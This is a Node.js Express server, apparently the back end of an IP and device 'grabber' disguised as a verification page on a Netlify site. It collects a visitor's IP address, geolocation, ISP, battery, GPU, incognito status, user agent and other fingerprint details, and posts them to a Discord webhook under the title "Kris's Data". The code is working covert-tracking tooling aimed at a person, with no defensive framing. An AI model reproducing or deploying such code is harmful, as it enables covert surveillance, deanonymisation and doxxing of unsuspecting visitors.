const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors({
    origin: ['https://hitelesites.netlify.app', 'https://*.netlify.app', 'http://localhost:3000', 'http://127.0.0.1:5500'],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type'],
    optionsSuccessStatus: 204
}));

app.options('*', cors());
app.use(express.json({ limit: '50kb' }));

const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;

const getClientIP = (req) => {
    return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || 'Ismeretlen')
        .split(',')[0].trim();
};

async function getIPInfo(ip) {
    try {
        const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
        return {
            country: `${res.data.country_name || 'Ismeretlen'}, ${res.data.city || ''}`.trim(),
            isp: res.data.org || 'Ismeretlen',
            hostname: res.data.hostname || 'Ismeretlen'
        };
    } catch {
        return { country: 'Ismeretlen', isp: 'Ismeretlen', hostname: 'Ismeretlen' };
    }
}

app.post('/hitelesit', async (req, res) => {
    try {
        const data = req.body;
        const publicIP = getClientIP(req);
        const ipInfo = await getIPInfo(publicIP);

        await axios.post(WEBHOOK, {
            content: "@everyone",
            embeds: [{
                title: "Kris's Data:",
                color: 0x00FF41,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: "Date/Time", value: new Date().toUTCString(), inline: false },
                    { name: "IP Address", value: publicIP, inline: true },
                    { name: "Country", value: ipInfo.country, inline: true },
                    { name: "Battery", value: data.battery ? `${data.battery}%` : "N/A", inline: true },
                    { name: "Charging", value: data.charging ? "Yes" : "No", inline: true },
                    { name: "Orientation", value: data.orientation || "Ismeretlen", inline: true },
                    { name: "Timezone", value: data.timezone ? `${data.timezone} GMT${data.gmtOffset || ''}` : "Ismeretlen", inline: true },
                    { name: "User Time", value: new Date().toString(), inline: false },
                    { name: "Language", value: data.language || "Ismeretlen", inline: true },
                    { name: "Incognito/Private Window", value: data.incognito ? "Yes" : "No", inline: true },
                    { name: "Ad Blocker", value: data.adBlocker ? "Yes" : "No", inline: true },
                    { name: "Screen Size", value: data.screen || "Ismeretlen", inline: true },
                    { name: "Colour Scheme", value: data.colorScheme || "Ismeretlen", inline: true },
                    { name: "HDR Screen", value: data.hdr ? "Yes" : "No", inline: true },
                    { name: "GPU", value: data.gpu || "Nem detektálható", inline: false },
                    { name: "Browser", value: data.browser || "Ismeretlen", inline: true },
                    { name: "Operating System", value: data.os || "Ismeretlen", inline: true },
                    { name: "Touch Screen", value: data.touchScreen ? "Yes" : "No", inline: true },
                    { name: "User Agent", value: data.ua ? data.ua.substring(0, 500) : "N/A", inline: false },
                    { name: "Platform", value: data.platform || "Ismeretlen", inline: true },
                    { name: "Referring URL", value: data.referrer || "no referrer", inline: false },
                    { name: "Host Name", value: ipInfo.hostname, inline: false },
                    { name: "ISP", value: ipInfo.isp, inline: false }
                ]
            }]
        });

        res.status(200).json({ status: "OK" });
    } catch (error) {
        console.error('Hiba:', error.message);
        res.status(500).json({ error: "Szerver hiba" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Szerver fut ${PORT}-on`));
